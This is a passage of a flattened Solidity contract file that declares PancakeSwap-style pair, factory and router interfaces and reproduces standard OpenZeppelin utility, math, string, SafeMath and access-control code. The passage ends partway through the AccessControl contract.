1 // SPDX-License-Identifier: GPL-3.0
2 
3 pragma solidity ^0.8.4;
4 
5 interface IPancakePair {
6     event Approval(address indexed owner, address indexed spender, uint value);
7     event Transfer(address indexed from, address indexed to, uint value);
8 
9     function name() external pure returns (string memory);
10     function symbol() external pure returns (string memory);
11     function decimals() external pure returns (uint8);
12     function totalSupply() external view returns (uint);
13     function balanceOf(address owner) external view returns (uint);
14     function allowance(address owner, address spender) external view returns (uint);
15 
16     function approve(address spender, uint value) external returns (bool);
17     function transfer(address to, uint value) external returns (bool);
18     function transferFrom(address from, address to, uint value) external returns (bool);
19 
20     function DOMAIN_SEPARATOR() external view returns (bytes32);
21     function PERMIT_TYPEHASH() external pure returns (bytes32);
22     function nonces(address owner) external view returns (uint);
23 
24     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
25 
26     event Mint(address indexed sender, uint amount0, uint amount1);
27     event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
28     event Swap(
29         address indexed sender,
30         uint amount0In,
31         uint amount1In,
32         uint amount0Out,
33         uint amount1Out,
34         address indexed to
35     );
36     event Sync(uint112 reserve0, uint112 reserve1);
37 
38     function MINIMUM_LIQUIDITY() external pure returns (uint);
39     function factory() external view returns (address);
40     function token0() external view returns (address);
41     function token1() external view returns (address);
42     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
43     function price0CumulativeLast() external view returns (uint);
44     function price1CumulativeLast() external view returns (uint);
45     function kLast() external view returns (uint);
46 
47     function mint(address to) external returns (uint liquidity);
48     function burn(address to) external returns (uint amount0, uint amount1);
49     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
50     function skim(address to) external;
51     function sync() external;
52 
53     function initialize(address, address) external;
54 }
55 // File: ISwapFactory.sol
56 
57 
58 pragma solidity ^0.8.4;
59 
60 interface ISwapFactory {
61     function createPair(address tokenA, address tokenB) external returns (address pair);
62     function getPair(address tokenA, address tokenB) external returns (address pair);
63 }
64 // File: ISwapRouter.sol
65 
66 
67 pragma solidity ^0.8.4;
68 
69 interface ISwapRouter {
70     
71     function factoryV2() external pure returns (address);
72 
73     function factory() external pure returns (address);
74 
75     function WETH() external pure returns (address);
76     
77     function swapExactTokensForTokens(
78         uint amountIn,
79         uint amountOutMin,
80         address[] calldata path,
81         address to
82     ) external;
83 
84     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
85         uint amountIn,
86         uint amountOutMin,
87         address[] calldata path,
88         address to,
89         uint deadline
90     ) external;
91     function swapExactTokensForETHSupportingFeeOnTransferTokens(
92         uint amountIn,
93         uint amountOutMin,
94         address[] calldata path,
95         address to,
96         uint deadline
97     ) external;
98 
99     function addLiquidity(
100         address tokenA,
101         address tokenB,
102         uint amountADesired,
103         uint amountBDesired,
104         uint amountAMin,
105         uint amountBMin,
106         address to,
107         uint deadline
108     ) external returns (uint amountA, uint amountB, uint liquidity);
109     function addLiquidityETH(
110         address token,
111         uint amountTokenDesired,
112         uint amountTokenMin,
113         uint amountETHMin,
114         address to,
115         uint deadline
116     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
117     
118     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
119     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
120     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
121     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
122     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
123     
124 }
125 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
126 
127 
128 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
129 
130 pragma solidity ^0.8.0;
131 
132 /**
133  * @dev Interface of the ERC165 standard, as defined in the
134  * https://eips.ethereum.org/EIPS/eip-165[EIP].
135  *
136  * Implementers can declare support of contract interfaces, which can then be
137  * queried by others ({ERC165Checker}).
138  *
139  * For an implementation, see {ERC165}.
140  */
141 interface IERC165 {
142     /**
143      * @dev Returns true if this contract implements the interface defined by
144      * `interfaceId`. See the corresponding
145      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
146      * to learn more about how these ids are created.
147      *
148      * This function call must use less than 30 000 gas.
149      */
150     function supportsInterface(bytes4 interfaceId) external view returns (bool);
151 }
152 
153 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
154 
155 
156 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
157 
158 pragma solidity ^0.8.0;
159 
160 
161 /**
162  * @dev Implementation of the {IERC165} interface.
163  *
164  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
165  * for the additional interface id that will be supported. For example:
166  *
167  * ```solidity
168  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
169  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
170  * }
171  * ```
172  *
173  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
174  */
175 abstract contract ERC165 is IERC165 {
176     /**
177      * @dev See {IERC165-supportsInterface}.
178      */
179     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
180         return interfaceId == type(IERC165).interfaceId;
181     }
182 }
183 
184 // File: @openzeppelin/contracts/utils/math/SignedMath.sol
185 
186 
187 // OpenZeppelin Contracts (last updated v4.8.0) (utils/math/SignedMath.sol)
188 
189 pragma solidity ^0.8.0;
190 
191 /**
192  * @dev Standard signed math utilities missing in the Solidity language.
193  */
194 library SignedMath {
195     /**
196      * @dev Returns the largest of two signed numbers.
197      */
198     function max(int256 a, int256 b) internal pure returns (int256) {
199         return a > b ? a : b;
200     }
201 
202     /**
203      * @dev Returns the smallest of two signed numbers.
204      */
205     function min(int256 a, int256 b) internal pure returns (int256) {
206         return a < b ? a : b;
207     }
208 
209     /**
210      * @dev Returns the average of two signed numbers without overflow.
211      * The result is rounded towards zero.
212      */
213     function average(int256 a, int256 b) internal pure returns (int256) {
214         // Formula from the book "Hacker's Delight"
215         int256 x = (a & b) + ((a ^ b) >> 1);
216         return x + (int256(uint256(x) >> 255) & (a ^ b));
217     }
218 
219     /**
220      * @dev Returns the absolute unsigned value of a signed value.
221      */
222     function abs(int256 n) internal pure returns (uint256) {
223         unchecked {
224             // must be unchecked in order to support `n = type(int256).min`
225             return uint256(n >= 0 ? n : -n);
226         }
227     }
228 }
229 
230 // File: @openzeppelin/contracts/utils/math/Math.sol
231 
232 
233 // OpenZeppelin Contracts (last updated v4.9.0) (utils/math/Math.sol)
234 
235 pragma solidity ^0.8.0;
236 
237 /**
238  * @dev Standard math utilities missing in the Solidity language.
239  */
240 library Math {
241     enum Rounding {
242         Down, // Toward negative infinity
243         Up, // Toward infinity
244         Zero // Toward zero
245     }
246 
247     /**
248      * @dev Returns the largest of two numbers.
249      */
250     function max(uint256 a, uint256 b) internal pure returns (uint256) {
251         return a > b ? a : b;
252     }
253 
254     /**
255      * @dev Returns the smallest of two numbers.
256      */
257     function min(uint256 a, uint256 b) internal pure returns (uint256) {
258         return a < b ? a : b;
259     }
260 
261     /**
262      * @dev Returns the average of two numbers. The result is rounded towards
263      * zero.
264      */
265     function average(uint256 a, uint256 b) internal pure returns (uint256) {
266         // (a + b) / 2 can overflow.
267         return (a & b) + (a ^ b) / 2;
268     }
269 
270     /**
271      * @dev Returns the ceiling of the division of two numbers.
272      *
273      * This differs from standard division with `/` in that it rounds up instead
274      * of rounding down.
275      */
276     function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
277         // (a + b - 1) / b can overflow on addition, so we distribute.
278         return a == 0 ? 0 : (a - 1) / b + 1;
279     }
280 
281     /**
282      * @notice Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or denominator == 0
283      * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv)
284      * with further edits by Uniswap Labs also under MIT license.
285      */
286     function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {
287         unchecked {
288             // 512-bit multiply [prod1 prod0] = x * y. Compute the product mod 2^256 and mod 2^256 - 1, then use
289             // use the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256
290             // variables such that product = prod1 * 2^256 + prod0.
291             uint256 prod0; // Least significant 256 bits of the product
292             uint256 prod1; // Most significant 256 bits of the product
293             assembly {
294                 let mm := mulmod(x, y, not(0))
295                 prod0 := mul(x, y)
296                 prod1 := sub(sub(mm, prod0), lt(mm, prod0))
297             }
298 
299             // Handle non-overflow cases, 256 by 256 division.
300             if (prod1 == 0) {
301                 // Solidity will revert if denominator == 0, unlike the div opcode on its own.
302                 // The surrounding unchecked block does not change this fact.
303                 // See https://docs.soliditylang.org/en/latest/control-structures.html#checked-or-unchecked-arithmetic.
304                 return prod0 / denominator;
305             }
306 
307             // Make sure the result is less than 2^256. Also prevents denominator == 0.
308             require(denominator > prod1, "Math: mulDiv overflow");
309 
310             ///////////////////////////////////////////////
311             // 512 by 256 division.
312             ///////////////////////////////////////////////
313 
314             // Make division exact by subtracting the remainder from [prod1 prod0].
315             uint256 remainder;
316             assembly {
317                 // Compute remainder using mulmod.
318                 remainder := mulmod(x, y, denominator)
319 
320                 // Subtract 256 bit number from 512 bit number.
321                 prod1 := sub(prod1, gt(remainder, prod0))
322                 prod0 := sub(prod0, remainder)
323             }
324 
325             // Factor powers of two out of denominator and compute largest power of two divisor of denominator. Always >= 1.
326             // See https://cs.stackexchange.com/q/138556/92363.
327 
328             // Does not overflow because the denominator cannot be zero at this stage in the function.
329             uint256 twos = denominator & (~denominator + 1);
330             assembly {
331                 // Divide denominator by twos.
332                 denominator := div(denominator, twos)
333 
334                 // Divide [prod1 prod0] by twos.
335                 prod0 := div(prod0, twos)
336 
337                 // Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.
338                 twos := add(div(sub(0, twos), twos), 1)
339             }
340 
341             // Shift in bits from prod1 into prod0.
342             prod0 |= prod1 * twos;
343 
344             // Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such
345             // that denominator * inv = 1 mod 2^256. Compute the inverse by starting with a seed that is correct for
346             // four bits. That is, denominator * inv = 1 mod 2^4.
347             uint256 inverse = (3 * denominator) ^ 2;
348 
349             // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also works
350             // in modular arithmetic, doubling the correct bits in each step.
351             inverse *= 2 - denominator * inverse; // inverse mod 2^8
352             inverse *= 2 - denominator * inverse; // inverse mod 2^16
353             inverse *= 2 - denominator * inverse; // inverse mod 2^32
354             inverse *= 2 - denominator * inverse; // inverse mod 2^64
355             inverse *= 2 - denominator * inverse; // inverse mod 2^128
356             inverse *= 2 - denominator * inverse; // inverse mod 2^256
357 
358             // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.
359             // This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is
360             // less than 2^256, this is the final result. We don't need to compute the high bits of the result and prod1
361             // is no longer required.
362             result = prod0 * inverse;
363             return result;
364         }
365     }
366 
367     /**
368      * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.
369      */
370     function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {
371         uint256 result = mulDiv(x, y, denominator);
372         if (rounding == Rounding.Up && mulmod(x, y, denominator) > 0) {
373             result += 1;
374         }
375         return result;
376     }
377 
378     /**
379      * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded down.
380      *
381      * Inspired by Henry S. Warren, Jr.'s "Hacker's Delight" (Chapter 11).
382      */
383     function sqrt(uint256 a) internal pure returns (uint256) {
384         if (a == 0) {
385             return 0;
386         }
387 
388         // For our first guess, we get the biggest power of 2 which is smaller than the square root of the target.
389         //
390         // We know that the "msb" (most significant bit) of our target number `a` is a power of 2 such that we have
391         // `msb(a) <= a < 2*msb(a)`. This value can be written `msb(a)=2**k` with `k=log2(a)`.
392         //
393         // This can be rewritten `2**log2(a) <= a < 2**(log2(a) + 1)`
394         // → `sqrt(2**k) <= sqrt(a) < sqrt(2**(k+1))`
395         // → `2**(k/2) <= sqrt(a) < 2**((k+1)/2) <= 2**(k/2 + 1)`
396         //
397         // Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.
398         uint256 result = 1 << (log2(a) >> 1);
399 
400         // At this point `result` is an estimation with one bit of precision. We know the true value is a uint128,
401         // since it is the square root of a uint256. Newton's method converges quadratically (precision doubles at
402         // every iteration). We thus need at most 7 iteration to turn our partial result with one bit of precision
403         // into the expected uint128 result.
404         unchecked {
405             result = (result + a / result) >> 1;
406             result = (result + a / result) >> 1;
407             result = (result + a / result) >> 1;
408             result = (result + a / result) >> 1;
409             result = (result + a / result) >> 1;
410             result = (result + a / result) >> 1;
411             result = (result + a / result) >> 1;
412             return min(result, a / result);
413         }
414     }
415 
416     /**
417      * @notice Calculates sqrt(a), following the selected rounding direction.
418      */
419     function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {
420         unchecked {
421             uint256 result = sqrt(a);
422             return result + (rounding == Rounding.Up && result * result < a ? 1 : 0);
423         }
424     }
425 
426     /**
427      * @dev Return the log in base 2, rounded down, of a positive value.
428      * Returns 0 if given 0.
429      */
430     function log2(uint256 value) internal pure returns (uint256) {
431         uint256 result = 0;
432         unchecked {
433             if (value >> 128 > 0) {
434                 value >>= 128;
435                 result += 128;
436             }
437             if (value >> 64 > 0) {
438                 value >>= 64;
439                 result += 64;
440             }
441             if (value >> 32 > 0) {
442                 value >>= 32;
443                 result += 32;
444             }
445             if (value >> 16 > 0) {
446                 value >>= 16;
447                 result += 16;
448             }
449             if (value >> 8 > 0) {
450                 value >>= 8;
451                 result += 8;
452             }
453             if (value >> 4 > 0) {
454                 value >>= 4;
455                 result += 4;
456             }
457             if (value >> 2 > 0) {
458                 value >>= 2;
459                 result += 2;
460             }
461             if (value >> 1 > 0) {
462                 result += 1;
463             }
464         }
465         return result;
466     }
467 
468     /**
469      * @dev Return the log in base 2, following the selected rounding direction, of a positive value.
470      * Returns 0 if given 0.
471      */
472     function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {
473         unchecked {
474             uint256 result = log2(value);
475             return result + (rounding == Rounding.Up && 1 << result < value ? 1 : 0);
476         }
477     }
478 
479     /**
480      * @dev Return the log in base 10, rounded down, of a positive value.
481      * Returns 0 if given 0.
482      */
483     function log10(uint256 value) internal pure returns (uint256) {
484         uint256 result = 0;
485         unchecked {
486             if (value >= 10 ** 64) {
487                 value /= 10 ** 64;
488                 result += 64;
489             }
490             if (value >= 10 ** 32) {
491                 value /= 10 ** 32;
492                 result += 32;
493             }
494             if (value >= 10 ** 16) {
495                 value /= 10 ** 16;
496                 result += 16;
497             }
498             if (value >= 10 ** 8) {
499                 value /= 10 ** 8;
500                 result += 8;
501             }
502             if (value >= 10 ** 4) {
503                 value /= 10 ** 4;
504                 result += 4;
505             }
506             if (value >= 10 ** 2) {
507                 value /= 10 ** 2;
508                 result += 2;
509             }
510             if (value >= 10 ** 1) {
511                 result += 1;
512             }
513         }
514         return result;
515     }
516 
517     /**
518      * @dev Return the log in base 10, following the selected rounding direction, of a positive value.
519      * Returns 0 if given 0.
520      */
521     function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {
522         unchecked {
523             uint256 result = log10(value);
524             return result + (rounding == Rounding.Up && 10 ** result < value ? 1 : 0);
525         }
526     }
527 
528     /**
529      * @dev Return the log in base 256, rounded down, of a positive value.
530      * Returns 0 if given 0.
531      *
532      * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.
533      */
534     function log256(uint256 value) internal pure returns (uint256) {
535         uint256 result = 0;
536         unchecked {
537             if (value >> 128 > 0) {
538                 value >>= 128;
539                 result += 16;
540             }
541             if (value >> 64 > 0) {
542                 value >>= 64;
543                 result += 8;
544             }
545             if (value >> 32 > 0) {
546                 value >>= 32;
547                 result += 4;
548             }
549             if (value >> 16 > 0) {
550                 value >>= 16;
551                 result += 2;
552             }
553             if (value >> 8 > 0) {
554                 result += 1;
555             }
556         }
557         return result;
558     }
559 
560     /**
561      * @dev Return the log in base 256, following the selected rounding direction, of a positive value.
562      * Returns 0 if given 0.
563      */
564     function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {
565         unchecked {
566             uint256 result = log256(value);
567             return result + (rounding == Rounding.Up && 1 << (result << 3) < value ? 1 : 0);
568         }
569     }
570 }
571 
572 // File: @openzeppelin/contracts/utils/Strings.sol
573 
574 
575 // OpenZeppelin Contracts (last updated v4.9.0) (utils/Strings.sol)
576 
577 pragma solidity ^0.8.0;
578 
579 
580 
581 /**
582  * @dev String operations.
583  */
584 library Strings {
585     bytes16 private constant _SYMBOLS = "0123456789abcdef";
586     uint8 private constant _ADDRESS_LENGTH = 20;
587 
588     /**
589      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
590      */
591     function toString(uint256 value) internal pure returns (string memory) {
592         unchecked {
593             uint256 length = Math.log10(value) + 1;
594             string memory buffer = new string(length);
595             uint256 ptr;
596             /// @solidity memory-safe-assembly
597             assembly {
598                 ptr := add(buffer, add(32, length))
599             }
600             while (true) {
601                 ptr--;
602                 /// @solidity memory-safe-assembly
603                 assembly {
604                     mstore8(ptr, byte(mod(value, 10), _SYMBOLS))
605                 }
606                 value /= 10;
607                 if (value == 0) break;
608             }
609             return buffer;
610         }
611     }
612 
613     /**
614      * @dev Converts a `int256` to its ASCII `string` decimal representation.
615      */
616     function toString(int256 value) internal pure returns (string memory) {
617         return string(abi.encodePacked(value < 0 ? "-" : "", toString(SignedMath.abs(value))));
618     }
619 
620     /**
621      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
622      */
623     function toHexString(uint256 value) internal pure returns (string memory) {
624         unchecked {
625             return toHexString(value, Math.log256(value) + 1);
626         }
627     }
628 
629     /**
630      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
631      */
632     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
633         bytes memory buffer = new bytes(2 * length + 2);
634         buffer[0] = "0";
635         buffer[1] = "x";
636         for (uint256 i = 2 * length + 1; i > 1; --i) {
637             buffer[i] = _SYMBOLS[value & 0xf];
638             value >>= 4;
639         }
640         require(value == 0, "Strings: hex length insufficient");
641         return string(buffer);
642     }
643 
644     /**
645      * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal representation.
646      */
647     function toHexString(address addr) internal pure returns (string memory) {
648         return toHexString(uint256(uint160(addr)), _ADDRESS_LENGTH);
649     }
650 
651     /**
652      * @dev Returns true if the two strings are equal.
653      */
654     function equal(string memory a, string memory b) internal pure returns (bool) {
655         return keccak256(bytes(a)) == keccak256(bytes(b));
656     }
657 }
658 
659 // File: @openzeppelin/contracts/access/IAccessControl.sol
660 
661 
662 // OpenZeppelin Contracts v4.4.1 (access/IAccessControl.sol)
663 
664 pragma solidity ^0.8.0;
665 
666 /**
667  * @dev External interface of AccessControl declared to support ERC165 detection.
668  */
669 interface IAccessControl {
670     /**
671      * @dev Emitted when `newAdminRole` is set as ``role``'s admin role, replacing `previousAdminRole`
672      *
673      * `DEFAULT_ADMIN_ROLE` is the starting admin for all roles, despite
674      * {RoleAdminChanged} not being emitted signaling this.
675      *
676      * _Available since v3.1._
677      */
678     event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole);
679 
680     /**
681      * @dev Emitted when `account` is granted `role`.
682      *
683      * `sender` is the account that originated the contract call, an admin role
684      * bearer except when using {AccessControl-_setupRole}.
685      */
686     event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);
687 
688     /**
689      * @dev Emitted when `account` is revoked `role`.
690      *
691      * `sender` is the account that originated the contract call:
692      *   - if using `revokeRole`, it is the admin role bearer
693      *   - if using `renounceRole`, it is the role bearer (i.e. `account`)
694      */
695     event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);
696 
697     /**
698      * @dev Returns `true` if `account` has been granted `role`.
699      */
700     function hasRole(bytes32 role, address account) external view returns (bool);
701 
702     /**
703      * @dev Returns the admin role that controls `role`. See {grantRole} and
704      * {revokeRole}.
705      *
706      * To change a role's admin, use {AccessControl-_setRoleAdmin}.
707      */
708     function getRoleAdmin(bytes32 role) external view returns (bytes32);
709 
710     /**
711      * @dev Grants `role` to `account`.
712      *
713      * If `account` had not been already granted `role`, emits a {RoleGranted}
714      * event.
715      *
716      * Requirements:
717      *
718      * - the caller must have ``role``'s admin role.
719      */
720     function grantRole(bytes32 role, address account) external;
721 
722     /**
723      * @dev Revokes `role` from `account`.
724      *
725      * If `account` had been granted `role`, emits a {RoleRevoked} event.
726      *
727      * Requirements:
728      *
729      * - the caller must have ``role``'s admin role.
730      */
731     function revokeRole(bytes32 role, address account) external;
732 
733     /**
734      * @dev Revokes `role` from the calling account.
735      *
736      * Roles are often managed via {grantRole} and {revokeRole}: this function's
737      * purpose is to provide a mechanism for accounts to lose their privileges
738      * if they are compromised (such as when a trusted device is misplaced).
739      *
740      * If the calling account had been granted `role`, emits a {RoleRevoked}
741      * event.
742      *
743      * Requirements:
744      *
745      * - the caller must be `account`.
746      */
747     function renounceRole(bytes32 role, address account) external;
748 }
749 
750 // File: @openzeppelin/contracts/utils/math/SafeMath.sol
751 
752 
753 // OpenZeppelin Contracts (last updated v4.9.0) (utils/math/SafeMath.sol)
754 
755 pragma solidity ^0.8.0;
756 
757 // CAUTION
758 // This version of SafeMath should only be used with Solidity 0.8 or later,
759 // because it relies on the compiler's built in overflow checks.
760 
761 /**
762  * @dev Wrappers over Solidity's arithmetic operations.
763  *
764  * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
765  * now has built in overflow checking.
766  */
767 library SafeMath {
768     /**
769      * @dev Returns the addition of two unsigned integers, with an overflow flag.
770      *
771      * _Available since v3.4._
772      */
773     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
774         unchecked {
775             uint256 c = a + b;
776             if (c < a) return (false, 0);
777             return (true, c);
778         }
779     }
780 
781     /**
782      * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
783      *
784      * _Available since v3.4._
785      */
786     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
787         unchecked {
788             if (b > a) return (false, 0);
789             return (true, a - b);
790         }
791     }
792 
793     /**
794      * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
795      *
796      * _Available since v3.4._
797      */
798     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
799         unchecked {
800             // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
801             // benefit is lost if 'b' is also tested.
802             // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
803             if (a == 0) return (true, 0);
804             uint256 c = a * b;
805             if (c / a != b) return (false, 0);
806             return (true, c);
807         }
808     }
809 
810     /**
811      * @dev Returns the division of two unsigned integers, with a division by zero flag.
812      *
813      * _Available since v3.4._
814      */
815     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
816         unchecked {
817             if (b == 0) return (false, 0);
818             return (true, a / b);
819         }
820     }
821 
822     /**
823      * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
824      *
825      * _Available since v3.4._
826      */
827     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
828         unchecked {
829             if (b == 0) return (false, 0);
830             return (true, a % b);
831         }
832     }
833 
834     /**
835      * @dev Returns the addition of two unsigned integers, reverting on
836      * overflow.
837      *
838      * Counterpart to Solidity's `+` operator.
839      *
840      * Requirements:
841      *
842      * - Addition cannot overflow.
843      */
844     function add(uint256 a, uint256 b) internal pure returns (uint256) {
845         return a + b;
846     }
847 
848     /**
849      * @dev Returns the subtraction of two unsigned integers, reverting on
850      * overflow (when the result is negative).
851      *
852      * Counterpart to Solidity's `-` operator.
853      *
854      * Requirements:
855      *
856      * - Subtraction cannot overflow.
857      */
858     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
859         return a - b;
860     }
861 
862     /**
863      * @dev Returns the multiplication of two unsigned integers, reverting on
864      * overflow.
865      *
866      * Counterpart to Solidity's `*` operator.
867      *
868      * Requirements:
869      *
870      * - Multiplication cannot overflow.
871      */
872     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
873         return a * b;
874     }
875 
876     /**
877      * @dev Returns the integer division of two unsigned integers, reverting on
878      * division by zero. The result is rounded towards zero.
879      *
880      * Counterpart to Solidity's `/` operator.
881      *
882      * Requirements:
883      *
884      * - The divisor cannot be zero.
885      */
886     function div(uint256 a, uint256 b) internal pure returns (uint256) {
887         return a / b;
888     }
889 
890     /**
891      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
892      * reverting when dividing by zero.
893      *
894      * Counterpart to Solidity's `%` operator. This function uses a `revert`
895      * opcode (which leaves remaining gas untouched) while Solidity uses an
896      * invalid opcode to revert (consuming all remaining gas).
897      *
898      * Requirements:
899      *
900      * - The divisor cannot be zero.
901      */
902     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
903         return a % b;
904     }
905 
906     /**
907      * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
908      * overflow (when the result is negative).
909      *
910      * CAUTION: This function is deprecated because it requires allocating memory for the error
911      * message unnecessarily. For custom revert reasons use {trySub}.
912      *
913      * Counterpart to Solidity's `-` operator.
914      *
915      * Requirements:
916      *
917      * - Subtraction cannot overflow.
918      */
919     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
920         unchecked {
921             require(b <= a, errorMessage);
922             return a - b;
923         }
924     }
925 
926     /**
927      * @dev Returns the integer division of two unsigned integers, reverting with custom message on
928      * division by zero. The result is rounded towards zero.
929      *
930      * Counterpart to Solidity's `/` operator. Note: this function uses a
931      * `revert` opcode (which leaves remaining gas untouched) while Solidity
932      * uses an invalid opcode to revert (consuming all remaining gas).
933      *
934      * Requirements:
935      *
936      * - The divisor cannot be zero.
937      */
938     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
939         unchecked {
940             require(b > 0, errorMessage);
941             return a / b;
942         }
943     }
944 
945     /**
946      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
947      * reverting with custom message when dividing by zero.
948      *
949      * CAUTION: This function is deprecated because it requires allocating memory for the error
950      * message unnecessarily. For custom revert reasons use {tryMod}.
951      *
952      * Counterpart to Solidity's `%` operator. This function uses a `revert`
953      * opcode (which leaves remaining gas untouched) while Solidity uses an
954      * invalid opcode to revert (consuming all remaining gas).
955      *
956      * Requirements:
957      *
958      * - The divisor cannot be zero.
959      */
960     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
961         unchecked {
962             require(b > 0, errorMessage);
963             return a % b;
964         }
965     }
966 }
967 
968 // File: @openzeppelin/contracts/utils/Context.sol
969 
970 
971 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
972 
973 pragma solidity ^0.8.0;
974 
975 /**
976  * @dev Provides information about the current execution context, including the
977  * sender of the transaction and its data. While these are generally available
978  * via msg.sender and msg.data, they should not be accessed in such a direct
979  * manner, since when dealing with meta-transactions the account sending and
980  * paying for execution may not be the actual sender (as far as an application
981  * is concerned).
982  *
983  * This contract is only required for intermediate, library-like contracts.
984  */
985 abstract contract Context {
986     function _msgSender() internal view virtual returns (address) {
987         return msg.sender;
988     }
989 
990     function _msgData() internal view virtual returns (bytes calldata) {
991         return msg.data;
992     }
993 }
994 
995 // File: @openzeppelin/contracts/access/AccessControl.sol
996 
997 
998 // OpenZeppelin Contracts (last updated v4.9.0) (access/AccessControl.sol)
999 
1000 pragma solidity ^0.8.0;
1001 
1002 
1003 
1004 
1005 
1006 /**
1007  * @dev Contract module that allows children to implement role-based access
1008  * control mechanisms. This is a lightweight version that doesn't allow enumerating role
1009  * members except through off-chain means by accessing the contract event logs. Some
1010  * applications may benefit from on-chain enumerability, for those cases see
1011  * {AccessControlEnumerable}.
1012  *
1013  * Roles are referred to by their `bytes32` identifier. These should be exposed
1014  * in the external API and be unique. The best way to achieve this is by
1015  * using `public constant` hash digests:
1016  *
1017  * ```solidity
1018  * bytes32 public constant MY_ROLE = keccak256("MY_ROLE");
1019  * ```
1020  *
1021  * Roles can be used to represent a set of permissions. To restrict access to a
1022  * function call, use {hasRole}:
1023  *
1024  * ```solidity
1025  * function foo() public {
1026  *     require(hasRole(MY_ROLE, msg.sender));
1027  *     ...
1028  * }
1029  * ```
1030  *
1031  * Roles can be granted and revoked dynamically via the {grantRole} and
1032  * {revokeRole} functions. Each role has an associated admin role, and only
1033  * accounts that have a role's admin role can call {grantRole} and {revokeRole}.
1034  *
1035  * By default, the admin role for all roles is `DEFAULT_ADMIN_ROLE`, which means
1036  * that only accounts with this role will be able to grant or revoke other
1037  * roles. More complex role relationships can be created by using
1038  * {_setRoleAdmin}.
1039  *
1040  * WARNING: The `DEFAULT_ADMIN_ROLE` is also its own admin: it has permission to
1041  * grant and revoke this role. Extra precautions should be taken to secure
1042  * accounts that have been granted it. We recommend using {AccessControlDefaultAdminRules}
1043  * to enforce additional security measures for this role.
1044  */
1045 abstract contract AccessControl is Context, IAccessControl, ERC165 {
1046     struct RoleData {
1047         mapping(address => bool) members;
1048         bytes32 adminRole;
1049     }
1050 
1051     mapping(bytes32 => RoleData) private _roles;
1052 
1053     bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;
1054 
1055     /**
1056      * @dev Modifier that checks that an account has a specific role. Reverts
1057      * with a standardized message including the required role.
1058      *
1059      * The format of the revert reason is given by the following regular expression:
1060      *
